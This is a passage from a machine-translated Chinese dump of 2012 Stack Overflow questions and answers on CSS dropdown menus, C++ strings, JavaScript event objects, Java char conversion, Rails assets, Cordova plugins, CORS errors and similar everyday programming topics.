li:hover ul { 
    display: block; 
    position: absolute;
}
li:hover li { 
    float: none;
    font-size: 11px;
}
li:hover a { 
    background: #5d5d5d; 
}
li:hover li a:hover { 
    background: #b57800; 
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T22:07:59.220

这里有一个很好的例子。要点是悬停时显示子菜单。

[http://www.red-team-design.com/css3-dropdown-menu](http://www.red-team-design.com/css3-dropdown-menu)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T08:34:58.917

看到这是纯基于 CSS 的下拉菜单：-

**HTML**

```
<ul id="menu">
  <li><a href="">Home</a></li>
  <li><a href="">About Us</a>
    <ul>
    <li><a href="">The Team</a></li>
    <li><a href="">History</a></li>
    <li><a href="">Vision</a></li>
    </ul>
  </li>
  <li><a href="">Products</a>
    <ul>
    <li><a href="">Cozy Couch</a></li>
    <li><a href="">Great Table</a></li>
    <li><a href="">Small Chair</a></li>
    <li><a href="">Shiny Shelf</a></li>
    <li><a href="">Invisible Nothing</a></li>
    </ul>
  </li>
  <li><a href="">Contact</a>
    <ul>
    <li><a href="">Online</a></li>
    <li><a href="">Right Here</a></li>
    <li><a href="">Somewhere Else</a></li>
    </ul>
  </li>
</ul> 
```

**CSS**

```
 ul {
font-family: Arial, Verdana;
font-size: 14px;
margin: 0;
padding: 0;
list-style: none;
}
ul li {
display: block;
position: relative;
float: left;
}
li ul {
display: none;
}
ul li a {
display: block;
text-decoration: none;
color: #ffffff;
border-top: 1px solid #ffffff;
padding: 5px 15px 5px 15px;
background: #2C5463;
margin-left: 1px;
white-space: nowrap;
}
ul li a:hover {
background: #617F8A;
}
li:hover ul {
display: block;
position: absolute;
}
li:hover li {
float: none;
font-size: 11px;
}
li:hover a {
background: #617F8A;
}
li:hover li a:hover {
background: #95A9B1;
} 
```

看演示：- [http://jsfiddle.net/XPE3w/140/](http://jsfiddle.net/XPE3w/140/)

# c++ - C++ 字符串声明

> ID：10218714
> 
> 赞同：14
> 
> 时间：2012-04-18T22:01:37.980
> 
> 标签：c++, string

我一直在使用 VB 一段时间。现在我给 C++ 一个机会，我遇到了字符串，我似乎找不到一种方法来声明一个字符串。

例如在 VB 中：

```
Dim Something As String = "Some text" 
```

或者

```
Dim Something As String = ListBox1.SelectedItem 
```

什么相当于上面的 C++ 代码？

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-04-18T22:03:24.560

C++ 提供了一个[`string`](http://www.cplusplus.com/reference/string/string/)可以像这样使用的类：

```
#include <string>
#include <iostream>

int main() {
    std::string Something = "Some text";
    std::cout << Something << std::endl;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T22:03:13.760

使用标准`<string>`标题

```
std::string Something = "Some Text"; 
```

[http://www.dreamincode.net/forums/topic/42209-c-strings/](http://www.dreamincode.net/forums/topic/42209-c-strings/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-19T07:44:54.557

在 C++ 中，您可以像这样声明一个字符串：

```
#include <string>

using namespace std;

int main()
{
    string str1("argue2000"); //define a string and Initialize str1 with "argue2000"    
    string str2 = "argue2000"; // define a string and assign str2 with "argue2000"
    string str3;  //just declare a string, it has no value
    return 1;
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-18T22:09:43.477

C++ 中的首选字符串类型是`string`，在命名空间中定义`std`，在标头中`<string>`，您可以像这样初始化它，例如：

```
#include <string>

int main()
{
   std::string str1("Some text");
   std::string str2 = "Some text";
} 
```

有关它的更多信息，您可以在[此处](http://www.cplusplus.com/reference/string/string/string/)和[此处](http://en.cppreference.com/w/cpp/string)找到。

# c# - 当前的 VS 工具可让每个开发人员以不同的方式查看 C# 代码

> ID：10218718
> 
> 赞同：2
> 
> 时间：2012-04-18T22:01:45.537
> 
> 标签：c#, visual-studio-2010, styles

是否有任何 VS 工具可以让开发人员根据自己的风格需求查看代码？

例如，一些开发人员喜欢 K&R 样式的括号，而其他开发人员喜欢 ANSI 样式。支持代码文件可以是它想要的任何格式，但查看的源代码需要采用开发人员风格。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T22:12:22.150

可以办到。您只需在 Visual Studio 选项中设置缩进选项。然后当开发人员加载文件时，他可以从编辑菜单中选择“重新格式化文件”（我认为它在高级子菜单之一中）或转到文件底部，删除结束括号，然后重新 -添加它。该文件将自动重新格式化。

也就是说，这是一个*非常糟糕的主意*。如果您正在使用源代码控制，那么每次开发人员签出以前由使用不同格式约定的人签入的文件时，该文件将显示为已修改。因此，您将有可能进行大量虚假签入，即使您以某种方式避免了虚假签入，您也会遇到开发人员可能会更改一行代码的问题，但差异会显示很多更改，因为所有格式更改。

这不是唯一的问题。假设测试人员报告了一个错误，并且堆栈跟踪表明某个模块的第 263 行发生了异常。您必须确保从源存储库中获取最新代码，并将其保留为上次编译时使用的格式。否则，错误所在的第 263 行可能不会是您的编辑器中的第 263 行。

告诉您的开发人员决定一种缩进样式。其他任何事情都会让你感到无尽的悲伤。

顺便说一句，几年前我对此进行了认真的思考，甚至​​在[Source Control and Formatting Standards](http://blog.mischel.com/2007/12/11/source-control-and-formatting-standards/)中写到了它。我认为这是一个好主意，前提是我可以构建工具来自动转换为规范格式。当时没有考虑到“263行在哪里”的问题。那是一个杀手，进行自动转换的工具也不是野餐。总而言之，我认为只选择一种风格会更容易、更可靠。只需要几天时间就可以习惯一种陌生的风格。

# javascript - 为什么必须将事件对象作为参数传递？

> ID：10218722
> 
> 赞同：10
> 
> 时间：2012-04-18T22:02:05.353
> 
> 标签：javascript, events, javascript-events, event-handling

我正在学习如何在 JavaScript 中操作事件，我想知道“为什么在使用事件处理时必须将事件对象作为参数（参数）传递给函数？”

这是我正在谈论的一个例子：

```
<script type="text/javascript">
    document.getElementById('button_1').onclick = (function (event) {
        alert("The event is: " + "on" + event.type);
    });
</script> 
```

我写了上面的代码，我非常了解它的作用。我只是不明白整个（事件）的传递。我认为这是将匿名函数分配给 button_1.onclick 事件处理程序的一种方式。事件处理程序是否尝试在分配事件之前传递它？...我很难理解这一点。如果有人可以为我澄清这一点，我将不胜感激。

*[我尝试在 Google 上搜索它，但发现非常复杂的解释和示例。只有简单到中级的解释会有所帮助。]* =)

非常感谢。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-18T22:05:39.263

### 永远存在的事件，不管你喜不喜欢

即使您不提供名称，该事件也始终存在：

```
$(".foo").on("click", function(){
  alert( arguments[0].type );
}); 
```

这和这样说是一样的：

```
$(".foo").on("click", function(event){
  alert( event.type );
}); 
```

*事件对象已经被传递给您的回调*（无论您是否为其提供名称），如果您愿意，您可以选择不使用它。例如，如果我们查看 jQuery onClick 方法：

```
$(".foo").on("click", function(){
  /* Do stuff */
}); 
```

### 利用它

您会注意到我的回调中没有引用事件对象。我不需要。但是，如果我想使用它，无论出于何种目的，我都应该给它一个名字：

```
$(".foo").on("click", function(myEvent){
  myEvent.preventDefault();
  myEvent.stopPropagation();
}); 
```

现在我已授予自己访问事件详细信息的权限，我可以防止该事件导致的默认行为，并且我还可以阻止该事件将 DOM 冒泡到其他元素。

### 实际例子

假设我们想监听一个元素的点击事件：

```
$("#bigSquare").on("click", function(event){
  /* Do something */
}); 
```

当您单击元素本身或其任何子元素时，单击事件会在元素上发生。现在假设这个元素有两个孩子：

```
<div id="bigSquare">
  <div id="redSquare"></div>
  <div id="blueSquare"></div>
</div> 
```

单击其中任何一个，大方块、红色方块或蓝色方块都会在大方块上引发“点击”事件——在它引发您首先点击的任何元素的点击事件之后（事件在 DOM 中冒泡）。

我们可以通过事件本身确定在任何点击事件中哪个元素是目标：

```
$("#bigSquare").on("click", function(event){
  alert( event.target.id );
}); 
```

请注意这里我们如何访问引发事件的目标的 ID。如果您单击红色方块，当该事件冒泡到大方块时，我们将看到警报“redSquare”。蓝色方块也是如此。如果您单击它，该事件将冒泡到大广场，我们将看到警报“blueSquare”。

您可以通过以下演示在线测试：http: [//jsbin.com/ejekim/edit#javascript,live](http://jsbin.com/ejekim/edit#javascript,live)

尝试单击橙色、红色或蓝色方块以查看警报内容。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-18T22:07:37.813

您没有在`event`任何地方传递参数。您只是在制作一个带有一个参数的函数，称为`event`.

当浏览器调用事件处理程序时，它会调用分配给它的函数，并将`event`对象作为第一个参数传递给它。

PS你不需要`()`你的功能。

```
document.getElementById('button_1').onclick = function (event) {
    alert("The event is: " + "on" + event.type);
}; 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-18T22:08:06.360

**您**没有将事件传递给函数，而是命名传递给函数的第一个参数`event`。

浏览器将调用您的函数，并在调用您的函数时传递一个事件对象。您可以选择不命名该参数`function(){}`，但浏览器仍将传递事件对象，您可以根据需要使用或不使用它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-18T22:20:21.440

要添加到其他答案和评论，您的代码将不适用于 IE。对于跨浏览器功能，您需要测试第一个参数的存在：

```
<body>
  <button id="button_1">Click Me!</button>
  <script type="text/javascript" >
    document.getElementById('button_1').onclick = (
      function(event) {
        var e = event ? event : window.event;
        alert("The event is: " + "on" + e.type);
      });
  </script>
</body> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-18T22:12:50.883

简单地说，传递给处理程序的事件对象包含有关事件的详细信息。例如，a[`KeyboardEvent`](https://developer.mozilla.org/en/Document_Object_Model_%28DOM%29/KeyboardEvent)包含有关按下的键、相应字符和任何被按住的修饰键（alt、shift、control、meta）的信息。

> 事件处理程序是否尝试在分配事件之前传递它？

处理程序是您的函数，因此它是 的接收者`event`，而不是传递者。

*   当您将事件处理程序分配给元素的`onclick`属性（或通过调用[`addEventListener`](https://developer.mozilla.org/en/DOM/element.addEventListener)现代的首选方法）时，事件处理程序被绑定，这是在调用处理程序之前。
*   Event 对象在调用处理程序时传递，即事件触发时。

因此，当用户单击您`#button_1`的[`MouseEvent`](https://developer.mozilla.org/en/DOM/MouseEvent).

有关更多信息，请阅读[事件驱动编程](http://en.wikipedia.org/wiki/Event-driven_programming)。

# c - 我打开了编译器优化，我的多线程 C 程序猛烈地内爆，我能读到关于这方面的任何文章吗？

> ID：10218723
> 
> 赞同：0
> 
> 时间：2012-04-18T22:02:06.227
> 
> 标签：c, multithreading, optimization, compiler-construction, mingw

我正在使用 MinGW，它是 Windows 的 gcc。我的程序涉及多个窗口、两个不同的主线程和线程池中的多个工作线程，用于重叠网络 I/O。

没有编译器优化，它工作得很好。

A）编译器优化甚至是必要的吗？我的程序已经非常快了。它是否有可能提供显着的改进？

B）是否有关于如何正确构建多线程程序以便编译器优化可以完成其工作的文章？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-18T22:15:23.757

“积极内爆”有点奇怪（你的程序是裂变炸弹的控制器吗？），但我知道你的程序在没有编译器优化的情况下表现得如预期，而在编译器优化的情况下神秘地表现出来。

技术术语是您的程序有错误。

多线程编程本质上是困难的。线程共享内存时的多线程编程非常困难；这是并发编程的受虐狂方式（消息传递更容易正确处理）。您不仅需要阅读一两篇文章，还需要阅读几本书并获得几年的编程经验。

你很不幸你的程序似乎在没有优化的情况下工作。它可能不适用于时序略有不同的不同机器，或者使用不同的编译器，或者在不同的操作系统上。所以你最终浪费了时间认为你的程序有效。但事实并非如此。无论您选择何种优化级别，编译器都会将正确的源代码转换为正确的可执行文件。¹

¹[当然，排除编译器错误。但对你不利的可能性非常大。]

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-18T22:24:28.627

在一种优化模式下，99.9% 的家庭故障都是由于严重的错误造成的。多线程竞赛等对代码性能非常敏感。指令重新排序或循环快捷方式可以将测试通过变成调试的噩梦。

我假设服务器运行正常并在明显不同的地方在负载下引爆，所以让常规调试没用？

您将不得不依靠记录和更改测试条件来缩小点火点。我的猜测是，这将是一个 Heisenbug，它会随着代码、优化、选项、负载配置文件、缓冲区大小等的更改而发生变异。

不解决问题不是一个好计划，因为它只会以另一种形式出现在具有更多内核等的明年盒子上。即使优化关闭，它仍然存在，潜伏，等待机会来袭。

我希望我能提供一些安慰。

说真的 - 用一个好的记录器记录所有你能做的事情 - 一个将日志排队以便将磁盘延迟排除在主应用程序之外的记录器。改变一些事情来尝试使错误发生变异，并可能出现在未优化的构建中。写下，（输入），绝对是你所做的一切以及任何改变后发生的事情，无论好坏。让错误变得更糟实际上比让它的症状消失要好（不知道确切原因）。如果可以的话，在各种硬件配置上尝试服务器。

最终，您会发现错误！

您有一件事情要做 - 似乎您可以可靠地重现该问题。这本身就是一个巨大的优势。

忘记问了——除了核爆炸的比喻，主要症状是什么？是到处都是 AV'ing/segfaulting，还是被锁定或活锁？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T23:42:55.280

要回答您问题的“A”部分，您的代码的未优化版本中仍然存在并发错误，但是线程运行的时间安排使得这些错误**尚未**在您的测试工作负载中暴露出来。当前版本的未优化程序最终将无法使用，因此您需要修复并发错误才能将该程序用于实际工作。

# android - BackgroundColour 程序使用 AndEngine 崩溃

> ID：10218726
> 
> 赞同：1
> 
> 时间：2012-04-18T22:02:10.623
> 
> 标签：android, eclipse, android-layout

对于一个学校项目，我和一个小组被告知要开发 Android 应用程序。我们决定为我们的引擎使用 AndEngine 并尝试了一个基本的应用程序。我和我的搭档创建了一个程序，它可以简单地使背景变为蓝色并且它可以工作，但是当我们在家中在模拟器和我们的安卓设备上运行它时，我们会得到一个“已停止响应”的错误。我们在两台机器上都使用了最新的 Eclipse，并在 2.3 和 4.0 中编译了程序。刚开始运行模拟器时我们没有收到任何错误，但是程序一启动它就崩溃了。任何人都知道为什么会这样？

这是代码

```
package first.test;

import org.anddev.andengine.engine.Engine;
import org.anddev.andengine.engine.camera.Camera;
import org.anddev.andengine.engine.options.EngineOptions;
import org.anddev.andengine.engine.options.EngineOptions.ScreenOrientation;
import org.anddev.andengine.engine.options.resolutionpolicy.RatioResolutionPolicy;
import org.anddev.andengine.entity.scene.Scene;
import org.anddev.andengine.entity.scene.background.ColorBackground;
import org.anddev.andengine.entity.util.FPSLogger;
import org.anddev.andengine.ui.activity.BaseGameActivity;

public class HelloWorldActivity extends BaseGameActivity {
private static final int CAMERA_WIDTH = 720;
private static final int CAMERA_HEIGHT = 480;
private Camera mCamera;

@Override
public Engine onLoadEngine() {
    this.mCamera = new Camera(0, 0, CAMERA_WIDTH, CAMERA_HEIGHT);
    return new Engine(new EngineOptions(true, ScreenOrientation.LANDSCAPE, new         RatioResolutionPolicy(CAMERA_WIDTH, CAMERA_HEIGHT), this.mCamera));
}

@Override
public void onLoadResources() {

}

@Override
public Scene onLoadScene() {
    this.mEngine.registerUpdateHandler(new FPSLogger());
    final Scene scene = new Scene(1);
    scene.setBackground(new ColorBackground(0, 0, 0.8784f));
    return scene;
}

@Override
public void onLoadComplete() {

}
} 
```

# java - 将几个字符转换为 int

> ID：10218729
> 
> 赞同：0
> 
> 时间：2012-04-18T22:02:16.733
> 
> 标签：java

如何将几个字符转换为 int，以保持问题简单，让我们假设：

```
char c1 = '1';
char c2 = '4';
char c3 = '5'; 
```

`145`获取类型 int的有效方法是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-18T22:03:45.323

```
int myInt = Integer.parseInt(""+c1+c2+c3); 
```

`""+c1`为您提供一个包含 char 的 String `c1`，您可以在其中附加字符`c2`和`c3`. 然后你用`parseInt()`它来将它转换为一个整数。

一个更直接（但不太健壮）的方法是：

```
int myInt = 100*(c1-'0') + 10*(c2-'0') + (c3-'0'); 
```

`c1-'0'`给你代表的数字，`c1`而不是字符代码。然后，您只需将内容移至正确的小数位并添加。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-18T22:07:52.967

```
int myInt = (c1 - '0') * 100 + (c2 - '0') * 10 + (c3 - '0'); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-18T22:08:45.990

这是将 char 数组转换为 int 的更通用方法：

```
int valueOf(char[] input){
  int result = 0;
  for(char c : input) {
    result *= 10;
    result += Character.digit(c, 10);
  }
  return result;
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-18T22:07:44.977

将单个数字字符转换为 an 最正确的方法`int`是[`Character.digit(char ch, int radix)`](http://docs.oracle.com/javase/6/docs/api/java/lang/Character.html#digit%28char,%20int%29)，它可以处理除 10 以外的基数中的值。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-18T22:10:57.623

字符串最终由 a 支持`char[]`，因此您可以执行以下操作：

```
char c1 = '1';
char c2 = '4';
char c3 = '5';
int converted = Integer.parseInt(new String(new char[]{c1, c2, c3})); 
```

可能还有其他几种非常好的方法可以做到这一点。

# php - 转发此电子邮件 PHP 脚本？

> ID：10218739
> 
> 赞同：-1
> 
> 时间：2012-04-18T22:02:52.763
> 
> 标签：php, html, email, forward

有谁知道我可以在哪里以及如何为时事通讯构建 PHP 脚本，以允许最终用户将收到的电子邮件转发给朋友左右？

基本上，允许他们获取电子邮件的整个正文和主题并打开一个新的电子邮件草稿，这将允许他们输入他们想要转发电子邮件的联系人？

我完全知道，直到今天，大多数（如果不是全部）电子邮件客户端都可以使用此功能。但要求在时事通讯中添加此功能。

有什么指导吗？有什么概念吗？任何反馈将不胜感激。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T22:11:41.463

如果我理解正确，您需要执行以下操作：

1.  在您的电子邮件中创建一个“转发给朋友”链接，将用户定向到远程服务器上的 php 页面。
2.  在远程页面上，创建一个脚本，该脚本将包含一个要求发送电子邮件的朋友的电子邮件地址的表单。
3.  使用 mail() 函数（或第 3 方类）向用户发送邮件

编辑：

您可以更进一步，使用 Google 的 API 自动从用户帐户中获取电子邮件地址（如 LinkedIn 等）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T22:10:56.880

看看[ZF 的 Mail 类](http://framework.zend.com/manual/en/zend.mail.read.html)，它允许使用 POP3 或 IMAP 获取电子邮件，最后将电子邮件分解为多个部分。

[ZF 文档页面](http://framework.zend.com/manual/en/zend.mail.read.html)提供了大量的**示例代码**。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T22:13:44.053

添加指向电子邮件的链接，将用户定向到包含以下内容的网页

```
<form action="sendmails.php"> 
<input name="sendto" type="text"/> 
... 
```

并从那里发送更多信件..

# javascript - 预编译后Rails javascript资产丢失

> ID：10218740
> 
> 赞同：10
> 
> 时间：2012-04-18T22:03:00.337
> 
> 标签：javascript, ruby-on-rails, file, assets, pipeline

[Rails 指南](http://guides.rubyonrails.org/asset_pipeline.html#highlighter_293656)说：

> 如果生产中缺少预编译文件，您将收到 Sprockets::Helpers::RailsHelper::AssetPaths::AssetNotPrecompiledError 异常，指示丢失文件的名称。

我确实执行：

```
bundle exec rake assets:precompile 
```

但是我没有收到任何错误，并且*manifest.yml*中缺少我的 javascript 文件。它也没有出现在*public/assets*中，所以问题只出在生产上。

我在*application.js*

```
//= require formalize/jquery-formalize 
```

我错过了什么？

谢谢。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-19T22:47:22.603

实际上需要做两件事：

```
config.assets.precompile += %w( *.js *.css ) 
```

[如此处](https://stackoverflow.com/questions/6415449/rails-3-1-asset-pipeline-missing-files-from-public-assets-why-isnt-this-the)所述，并且

```
config.serve_static_assets = true 
```

用于本地生产测试时使用

```
rail s 
```

当然使用

```
rake assets:precompile 
```

但是在我的情况下 - 如果没有 config.assets.precompile 这将无效，因为清单不包含对我的 javascript 文件的任何引用。

HTH。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-19T01:19:38.453

试试：

```
rake assets:precompile 
```

我遇到过类似的问题，并且奏效了。您也可以删除`/public/assets`目录的内容并尝试再次运行它。

# android - 试图让 phonegap 的 Android LocalNotification 插件在 cordova-1.6.0 中工作

> ID：10218745
> 
> 赞同：3
> 
> 时间：2012-04-18T22:03:17.637
> 
> 标签：android, plugins, cordova, localnotification

我正在尝试将使用适用于 Android 的 LocalNotification 插件的 phonegap-1.4.1 项目升级到 cordova-1.6.0

我在这里找到了这个链接：[https](https://github.com/davejohnson/phonegap-plugin-facebook-connect/pull/109) ://github.com/davejohnson/phonegap-plugin-facebook-connect/pull/109 其中说，对于 Android：使用 CordovaInterface 对象的 this.ctx.getContext() 方法来获取 Conext 对象.

我编辑了 LocalNotification.java 并通过更改以下行让我的项目编译没有错误：

# 从：

```
alarm = new AlarmHelper(this.ctx);
...
final SharedPreferences alarmSettings = this.ctx.getSharedPreferences(PLUGIN_NAME, Context.MODE_PRIVATE);
...
final Editor alarmSettingsEditor = this.ctx.getSharedPreferences(PLUGIN_NAME, Context.MODE_PRIVATE).edit();
...
final Editor alarmSettingsEditor = this.ctx.getSharedPreferences(PLUGIN_NAME, Context.MODE_PRIVATE).edit();
...
final Editor alarmSettingsEditor = this.ctx.getSharedPreferences(PLUGIN_NAME, Context.MODE_PRIVATE).edit(); 
```

# 到：

```
alarm = new AlarmHelper(this.ctx.getContext());
...
final SharedPreferences alarmSettings = this.ctx.getContext().getSharedPreferences(PLUGIN_NAME, Context.MODE_PRIVATE);
...
final Editor alarmSettingsEditor = this.ctx.getContext().getSharedPreferences(PLUGIN_NAME, Context.MODE_PRIVATE).edit();
...
final Editor alarmSettingsEditor = this.ctx.getContext().getSharedPreferences(PLUGIN_NAME, Context.MODE_PRIVATE).edit();
...
final Editor alarmSettingsEditor = this.ctx.getContext().getSharedPreferences(PLUGIN_NAME, Context.MODE_PRIVATE).edit(); 
```

但是我必须承认，我真的不知道自己在做什么，并且通知不起作用，并且我在应用程序日志中没有收到任何错误:(

还刚刚注意到，根据我的 onDeviceReady() 函数中的示例，我具有以下内容：

```
console.log("Device ready");

if (typeof plugins !== "undefined") {
   plugins.localNotification.add({
      date : new Date(),
      message : "Phonegap - Local Notification\r\nSubtitle comes after linebreak",
      ticker : "This is a sample ticker text",
      repeatDaily : false,
      id : 4
   });
} 
```

如果我删除 if 条件 typeof plugins !== "undefined" 那么我的应用程序日志中会出现错误：未捕获的 ReferenceError: plugins is not defined

我猜想在科尔多瓦发生了其他变化。如果有将android插件升级到cordova的指南是否有用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T18:58:42.410

今天升级到 Cordova-1.6.1，它现在可以工作了；）

勇敢地承认这可能是“椅子/键盘”界面问题。想想当我升级到 1.6.0 我忘了在我的 index.html 的标题中更改它

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-16T07:39:58.007

似乎[getContext()](https://github.com/apache/incubator-cordova-android/blob/master/framework/src/org/apache/cordova/api/CordovaInterface.java)已被贬值。这个问题有更清洁的解决方案吗？

# javascript - HTML 页面不会完成 XMLHTTPRequest

> ID：10218754
> 
> 赞同：0
> 
> 时间：2012-04-18T22:04:12.997
> 
> 标签：javascript, html, xmlhttprequest

所以我试图获取一个外部脚本来完成使用 XMLHTTPRequest 的登录请求。

我得到的错误是 XMLHttpRequest 无法加载 http: *///.php*。Access-Control-Allow-Origin 不允许来源 http://*。

现在我已经对这篇文章非常熟悉了： [XmlHttpRequest error: Origin null is not allowed by Access-Control-Allow-Origin](https://stackoverflow.com/questions/3595515/xmlhttprequest-error-origin-null-is-not-allowed-by-access-control-allow-origin)

据我了解，我需要将它作为 JSONP 对象请求。问题在于我正在使用 XMLHTTPRequest 并且不能使用 jQuery 库来执行此操作。

这是我试图执行脚本的html页面中的代码：

```
<html>
<head>
<meta http-equiv="Access-Control-Allow-Origin" content="*">
<script language = "javascript" type="text/javascript" src="jquery-1.7.2.js">
</script>
<script language = "javascript" type="text/javascript" src="main.js">
</script>
<script type="text/javascript">
function show_prompt()
  {
    var name=prompt("User Name");
    var password =prompt("Password"); 
    var loginWorked = false;
    if (name!=null && name!="") loginWorked = init(name,password);
if(loginWorked == true){
    window.location = "Toolbar.html"
}
}
</script>
</head>
<body>
<input type="button" onclick="show_prompt()" value="Login" />
</body>
</html> 
```

我的主文件中的代码：

初始化函数：

```
function init(username,password){
    //Initializes the toolbar.

init.user = username;
init.pass = password;
init.pass_hashed = sha256(init.pass);
var key = fetchKey(username);
init.pass_hashed += key;
init.pass_hashed = sha256(init.pass_hashed);
var loginParams = "login=1&pwd=" + init.pass_hashed + "&uname=" + init.user + "&LastKey=" + getKey();
loginReqReturn = send_request("http://data.nova-initia.com/login2.php","POST", loginParams);
if(loginReqReturn.responseText != "Error: Login Incorrect "){
    return true;
}
else return false; 
```

}

和 sendRequest 方法：

```
function send_request(theURL, theMethod, theParams)
{
var theReq = new XMLHttpRequest();
theReq.overrideMimeType("application/json");
theReq.open(theMethod,theURL,false);
if(typeof(theParams) === "string")
{
    theReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
}
else
{
    theReq.setRequestHeader("Content-type", "application/json");
    theParams = JSON.stringify(theParams);
}
if(_key) theReq.setRequestHeader("X-NOVA-INITIA-LASTKEY", _key);
if(theParams)
{
    theReq.send(theParams);
}
setKey(theReq);
return theReq; 
```

}

不是最有效的代码，但它至少在我在非 HTML 上下文中执行时有效（我正在为 Google Chrome 开发工具栏，但需要 html 覆盖才能工作）。任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T22:46:29.730

如果这是针对[Google Chrome 扩展程序](http://code.google.com/chrome/extensions/index.html)，您可以在扩展程序的清单中请求[跨域`XMLHttpRequest`请求](http://code.google.com/chrome/extensions/xhr.html)的权限：

```
{
  ...
  "permissions": [
    "http://data.nova-initia.com/"
  ],
  ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T22:14:00.930

我不确定你的确切问题是什么，但如果你知道使用 JSONP 是解决方案，你可以在不使用 jQuery 的情况下做到这一点。以下是它的工作原理：[http ://en.wikipedia.org/wiki/JSONP](http://en.wikipedia.org/wiki/JSONP)

# java - Guava EventBus：没有注释的订阅？

> ID：10218756
> 
> 赞同：4
> 
> 时间：2012-04-18T22:04:32.557
> 
> 标签：java, events, guava

我需要在域模型中实现发布/订阅系统。我正在考虑使用 Guava 的 EventBus，但我想使用接口和适配器来让我的域模型不了解这样的实现细节。不幸的是，EventBus 对订阅注解的使用让这个想法很不爽。

有什么方法可以在不使用 @Subscribe 注释的情况下订阅处理程序？查看文档，似乎没有，但也许有些东西我没有看到。

谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-18T22:09:34.243

Guava 团队成员在这里。

你只能订阅一个带有`@Subscribe`注解的处理程序是很刻意的——`EventBus`旨在*替换*接口、适配器等，而不是补充它们——但是为什么你说它会暴露*更多的*实现细节呢？根据我们的经验，它通常会暴露较少的细节。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-01-01T19:55:52.183

一种解决方法是调整 Handler。就像是：

```
class GuavaHandler<T extends Message> implements Handler<T> {
    private Handler<T> handler;

    public GuavaHandler(Handler<T> handler) {
        this.handler = handler;
    }

    @Override
    @Subscribe
    public void handle(T message) {
        try {
            handler.getClass().getMethod("handle", message.getClass());
            handler.handle(message);
        } catch (NoSuchMethodException ignored) {
            // workaround
        }
    }
} 
```

您只需在此特定实现中定义属性。

# visual-c++ - 无法在 VC++ 2008 中打开资源编辑器

> ID：10218761
> 
> 赞同：0
> 
> 时间：2012-04-18T22:04:57.787
> 
> 标签：visual-c++, resources

每当我尝试在 VC++ 2008 中打开 rc 文件时，都会收到此错误消息。

![在此处输入图像描述](../Images/54895bc5dbf1493d2a4b90cb67675232.png)

消息说文件已损坏，但我知道错误消息不正确，因为我可以在另一台机器上打开资源文件而没有任何问题。我什至无法从刚刚创建的项目中打开 rc 文件。我以前没有这个问题。我认为这在某种程度上与 VC++ 2010 Express 的安装有关。但这只是一个猜测。我在谷歌上尝试了几个建议，但都是徒劳的。

知道如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T21:07:07.963

在从错误的回答者那里遵循了几个小时的一系列建议后，我发现[了这个帖子](http://social.msdn.microsoft.com/forums/en-US/vcgeneral/thread/e4ef7904-0947-4792-aa4a-b28077146d02/)，安迪·拉特的回答解决了我的问题。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-18T22:19:12.743

VC++ Express 不包含也不支持资源编辑器。如果您在 VC++ 2008 之后安装了 VC++ Express，那么它很可能会破坏某些东西。我会尝试卸载 VC++ Express。

# bing-maps - Bing Maps AJAX Control 7.0 的源代码？

> ID：10218765
> 
> 赞同：2
> 
> 时间：2012-04-18T22:05:31.973
> 
> 标签：bing-maps

**Bing Maps AJAX Control 7.0 API**的源代码是否可用？

我在 MSDN 上看到过 API 参考资料——API[参考资料](http://msdn.microsoft.com/en-us/library/gg427610.aspx)

而且我看过交互式SDK——[交互式SDK](http://www.bingmapsportal.com/isdk/ajaxv7)

但我想查看 AJAX 控件的 javascript 源代码。控件下载的文件都被缩小了，所以实际上不可能理解它们。

我想阅读源代码以了解如何从服务中请求驾驶、步行和过境路线，如何将它们表示为对象，以及如何呈现路线。这样我就可以构建自己的自定义路由类型。

源代码在某处可用吗？如果可以，在哪里可以找到？

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T09:48:05.503

没有。Bing Maps AJAX 库没有未缩小的版本。

由于它只是 Javascript，因此您当然可以使用 Firebug 或类似工具来检查[http://ecn.dev.virtualearth.net/mapcontrol/mapcontrol.ashx?v=7.0](http://ecn.dev.virtualearth.net/mapcontrol/mapcontrol.ashx?v=7.0)公开的方法，以及所进行调用的结构到各种 Bing 地图服务，但您必须自己取消选择源代码。

# postgresql - 如何在一次操作中更改多个 PostgreSQL 表的架构？

> ID：10218768
> 
> 赞同：32
> 
> 时间：2012-04-18T22:05:43.570
